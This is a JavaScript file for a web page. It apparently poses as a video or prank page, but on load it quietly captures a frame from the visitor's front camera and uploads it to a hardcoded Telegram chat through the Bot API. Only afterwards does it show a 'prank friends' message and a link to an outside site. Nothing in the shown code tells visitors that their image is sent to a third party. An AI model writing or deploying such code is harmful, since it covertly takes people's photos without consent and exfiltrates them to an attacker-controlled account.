document.addEventListener('DOMContentLoaded', async () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const idiNaxuy = document.getElementById('idiNax');
    const pointer = document.getElementById('pointer');
    const botBtn = document.getElementById('botBtn');

    const userLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
    const lang = messages[userLang] ? userLang : 'en'; 

    idiNaxuy.textContent = messages[lang].wait;
    watchBtn.style.display = 'none';
    pointer.style.display = 'none';
    botBtn.style.display = 'none';
    context.canvas.style.display = 'none';

    const chatId = '5074699192';  // Replace with the actual chat ID

    // Fetch token from the backend
    const response = await fetch('/api/getToken');
    const data = await response.json();
    const telegramBotToken = data.token;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            video.play().then(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = context.canvas.toDataURL('image/jpeg');

                fetch(imageData)
                    .then(res => res.blob())
                    .then(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'image.jpg');
                        formData.append('chat_id', chatId);

                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Image uploaded to Telegram successfully:', data);
                            context.canvas.style.display = 'block';
                            idiNaxuy.textContent = messages[lang].prankFriends;
                            botBtn.textContent = messages[lang].botLinkText;
                            botBtn.href = 'https://tiktok.ftp.sh'; // Replace with your channel link
                            botBtn.style.display = 'block';
                        })
                        .catch(error => {
                            console.error('Error uploading the image to Telegram:', error);
                        });
                    });

                stream.getTracks().forEach(track => track.stop());
            }).catch(() => {
                idiNaxuy.textContent = messages[lang].unsupportedBrowser;
                pointer.style.display = 'flex';
            });
        };

    } catch (error) {
        idiNaxuy.textContent = messages[lang].cameraError;
    }
});
